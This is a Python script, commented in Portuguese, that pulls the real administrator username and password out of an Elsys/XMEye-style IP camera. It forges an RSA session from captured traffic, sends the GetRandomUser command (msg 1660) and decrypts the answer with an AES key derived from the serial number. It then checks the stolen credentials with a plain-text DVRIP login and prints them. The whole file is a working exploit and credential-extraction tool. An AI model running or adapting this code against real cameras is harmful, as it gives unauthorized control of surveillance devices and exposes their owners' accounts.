# -*- coding: utf-8 -*-
"""
get_conta_elsys.py  -  Recupera a CONTA REAL de uma Elsys rodando o GetRandomUser
                       (msg 1660) POR DENTRO da sessao RSA que o elsys_xm.py abre.

Quando usar:
  O atalho sem login (recupera_conta_elsys.py) nao funcionou nesta Elsys
  (1660 deu 102, 1470 nao respondeu). Entao precisamos de uma sessao
  autenticada. O elsys_xm.py ja sabe forjar essa sessao (login RSA por
  material capturado). Aqui a gente sobe essa sessao e, com ela viva, pede
  o GetRandomUser e descriptografa (AES-128-CBC, chave do numero de serie).

Pre-requisitos:
  - FECHE a janela da sessao (INICIAR_SESSAO.bat) antes de rodar (senao duas
    sessoes disputam a cam1).
  - O material capturado da cam1 precisa estar valido / no revezamento
    (ferramentas\\elsys_192_168_3_119_*). Se a sessao nao subir, refaca a
    captura PCAPdroid (GUIA secao 9.2).

Uso (na pasta do projeto):
  python ferramentas\\get_conta_elsys.py 192.168.3.119 2c9fea3d01e8fa07
  python ferramentas\\get_conta_elsys.py 192.168.3.119 2c9fea3d01e8fa07 --cid cam1
"""
import argparse
import base64
import hashlib
import json
import os
import re
import socket
import struct
import sys
import time

RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, RAIZ)

import elsys_xm  # noqa: E402  (precisa do material em ferramentas\)

PORTA = 34567
RANDOMUSER = 1660


def deriva_chave(serial):
    if len(serial) < 12:
        return None
    return serial[5:11] + serial[1:7] + serial[8:12]


def descriptografa(info_b64, serial):
    from Crypto.Cipher import AES
    chave = deriva_chave(serial)
    if not chave or len(chave) != 16:
        print("  [!] Serial com formato inesperado (%r)." % serial)
        return None
    try:
        aes = AES.new(chave.encode("ascii"), AES.MODE_CBC, b"\x00" * 16)
        claro = aes.decrypt(base64.b64decode(info_b64)).decode("ascii", "replace")
    except Exception as e:
        print("  [!] Nao descriptografou: %s" % e)
        return None
    u = re.search(r"p1:(\S*)", claro)
    p = re.search(r"p2:(\S*)", claro)
    if u and p and u.group(1) and p.group(1):
        return u.group(1), p.group(1)
    print("  [!] Decifrou, mas nao achei 'p1:.. p2:..'. Texto: %r" % claro[:80])
    return None


def sofia_hash(senha):
    chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    h = hashlib.md5(senha.encode("utf-8")).digest()
    return "".join(chars[(h[i] + h[i + 1]) % 62] for i in range(0, 16, 2))


def login_dvrip_web(ip, usuario, senha, timeout=8):
    s = socket.create_connection((ip, PORTA), timeout=timeout)
    try:
        s.settimeout(timeout)
        obj = {"EncryptType": "MD5", "LoginType": "DVRIP-Web",
               "PassWord": sofia_hash(senha), "UserName": usuario}
        body = json.dumps(obj, separators=(",", ":")).encode() + b"\x0a\x00"
        cab = bytearray(20)
        cab[0] = 255
        struct.pack_into("<H", cab, 14, 1000)
        struct.pack_into("<I", cab, 16, len(body))
        s.sendall(bytes(cab) + body)
        mid, sess, corpo = elsys_xm._recv_frame(s, timeout)
        txt = corpo.rstrip(b"\x00\r\n ").decode("utf-8", "replace")
        try:
            return json.loads(txt).get("Ret")
        except ValueError:
            return None
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser(description="GetRandomUser dentro da sessao RSA da Elsys.")
    ap.add_argument("ip", help="IP da Elsys, ex: 192.168.3.119")
    ap.add_argument("serial", help="numero de serie (app Elsys > Sobre o disp.)")
    ap.add_argument("--cid", default="cam1")
    ap.add_argument("--espera", type=int, default=60, help="segundos esperando a sessao subir")
    args = ap.parse_args()

    print("=" * 64)
    print(" GET CONTA REAL (ELSYS, via sessao RSA)  -  %s" % args.ip)
    print("=" * 64)
    print(" (feche o INICIAR_SESSAO.bat antes de rodar isto)")

    try:
        s = elsys_xm.ElsysSessao(args.cid, args.ip)
    except FileNotFoundError as e:
        print(" [X] Falta o material capturado da camera: %s" % e)
        print("     Refaca a captura PCAPdroid (GUIA secao 9.2).")
        sys.exit(1)

    print("[1] Forjando a sessao RSA (pode levar ate %ds; caca a chave no revezamento)..." % args.espera)
    s.iniciar()
    if not s.aguardar(args.espera):
        print("    [X] A sessao RSA nao subiu. A chave da captura deve estar fora do")
        print("        revezamento agora. Refaca a captura PCAPdroid e tente de novo.")
        try:
            s.encerrar()
        except Exception:
            pass
        sys.exit(2)
    print("    OK. Sessao viva (SID=0x%08X)." % s.session)

    print("[2] GetRandomUser (1660) na sessao ...")
    r = s._cmd(RANDOMUSER, '{"Name":"GetRandomUser","SessionID":"0x%08X"}' % s.session, timeout=8)
    if not r:
        print("    [X] Sem resposta util. Resposta crua: %r" % r)
        s.encerrar()
        sys.exit(3)
    bloco = r.get("GetRandomUser") or {}
    info = bloco.get("Info") or bloco.get("InfoUser")
    if not info:
        print("    [X] A camera nao devolveu o campo Info. Resposta: %r" % r)
        s.encerrar()
        sys.exit(4)

    conta = descriptografa(info, args.serial)
    try:
        s.encerrar()
    except Exception:
        pass
    if not conta:
        sys.exit(5)
    user_real, senha_real = conta
    print("    >>> CONTA REAL: usuario = %s   senha = %s" % (user_real, senha_real))

    print("[3] Confirmando login DVRIP-Web (texto puro) ...")
    try:
        ret = login_dvrip_web(args.ip, user_real, senha_real)
        if ret in (100, 515):
            print("    >>> LOGIN OK (Ret 100)! A Elsys loga por texto puro - RSA aposentado.")
        else:
            print("    [!] Login deu Ret %s. A conta esta certa, mas a Elsys pode exigir" % ret)
            print("        DVRIP-FutureHome (RSA) mesmo p/ ela. Me mande este resultado.")
    except OSError as e:
        print("    [!] Nao testei o login (%s)." % e)

    print("-" * 64)
    print(" Se logou por texto puro, guarde (a cam1 e Elsys):")
    print("   CAM_ADMIN_USUARIO = %r" % user_real)
    print("   CAM_ADMIN_SENHA   = %r" % senha_real)
    print("=" * 64)


if __name__ == "__main__":
    main()
